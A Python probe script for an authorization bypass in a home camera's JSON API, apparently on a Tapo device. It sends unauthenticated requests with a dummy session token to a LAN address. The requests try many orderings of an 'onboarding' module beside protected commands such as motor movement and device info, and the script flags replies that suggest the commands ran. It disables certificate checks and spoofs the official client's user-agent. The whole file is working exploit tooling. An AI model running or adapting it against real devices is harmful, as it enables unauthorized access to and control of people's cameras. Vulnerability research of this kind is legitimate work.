#!/usr/bin/env python3
"""Probe CVE-2026-105814: order-dependent authz in the DS JSON API.

Sends candidate shapes to /stok=<invalid>/ds with no session and classifies the reply.
A -40209 / -40407 / HTTP 401 means "still denied". Anything else (0, encrypted blob,
a device_confirm-only reply that is *not* the stok error) means the module ran.
"""
import json, ssl, sys, time, urllib.request, uuid

HOST = "192.168.4.70"
CTX = ssl._create_unverified_context()
STOK = "0" * 32
PATH = sys.argv[1] if len(sys.argv) > 1 else f"/stok={'0'*32}/ds"

ONB_SCAN = {"onboarding": {"scan": {}}}
PROT = [
    ("motorMove", {"motor": {"move": {"x_coord": "0", "y_coord": "0"}}}),
    ("getDeviceInfo", {"device_info": {"name": ["basic_info"]}}),
    ("getClockStatus", {"system": {"name": "clock_status"}}),
    ("getLedStatus", {"led": {"name": ["config"]}}),
]

shapes = []
for m, p in PROT:
    key = next(iter(p))
    real = p[key]
    shapes += [
        (f"{m}: params onboarding-then-real", {"method": m, "params": {"onboarding": {"scan": {}}, key: real}}),
        (f"{m}: params real-then-onboarding", {"method": m, "params": {key: real, "onboarding": {"scan": {}}}}),
        (f"{m}: top-level onboarding before", {"onboarding": {"scan": {}}, "method": m, "params": p}),
        (f"{m}: top-level onboarding after", {"method": m, "params": p, "onboarding": {"scan": {}}}),
        (f"{m}: params real+onboarding.connect", {"method": m, "params": {key: real, "onboarding": {"connect": {"unique_key": 1}}}}),
        (f"{m}: params onboarding at method level", {"method": m, "params": p, "onboarding": {"connect": {}}}),
        # reverse module confusion: public method carrying a protected module
        (f"{m}: method scanApList + module {key}", {"method": "scanApList", "params": {key: real, "onboarding": {"scan": {}}}}),
    ]

# multipleRequest with per-entry onboarding, and with a sibling onboarding entry
inner = [{"method": "motorMove", "params": {"motor": {"move": {"x_coord": "0", "y_coord": "0"}}}}]
shapes += [
    ("multi: onboarding in every entry",
     {"method": "multipleRequest", "params": {"requests": [
         {"method": "motorMove", "params": {"motor": {"move": {"x_coord": "0", "y_coord": "0"}}, "onboarding": {"scan": {}}}},
         {"method": "scanApList", "params": {"onboarding": {"scan": {}}}}]}}),
    ("multi: onboarding top-level", {"onboarding": {"scan": {}}, "method": "multipleRequest", "params": {"requests": inner}}),
]


def send(obj):
    body = json.dumps(obj).encode()
    req = urllib.request.Request(f"https://{HOST}{PATH}", data=body,
                                 headers={"Content-Type": "application/json",
                                          "User-Agent": "Tapo CameraClient Android"})
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=10) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:  # noqa: BLE001
        return 0, repr(e).encode()


def classify(status, body):
    try:
        j = json.loads(body)
    except Exception:  # noqa: BLE001
        return "OTHER", body[:120]
    code = j.get("error_code")
    if code == -40209:
        return "DENIED(shape)", body[:120]
    if code == -40407 or (isinstance(j.get("data"), dict) and j["data"].get("code") == -40407):
        return "DENIED(stok)", body[:120]
    return "EXEC?", body[:200]


if __name__ == "__main__":
    for name, obj in shapes:
        st, body = send(obj)
        verdict, detail = classify(st, body)
        print(f"{verdict:14} {st:3} {name}")
        if verdict == "EXEC?":
            print("    ", detail)
        time.sleep(0.5)
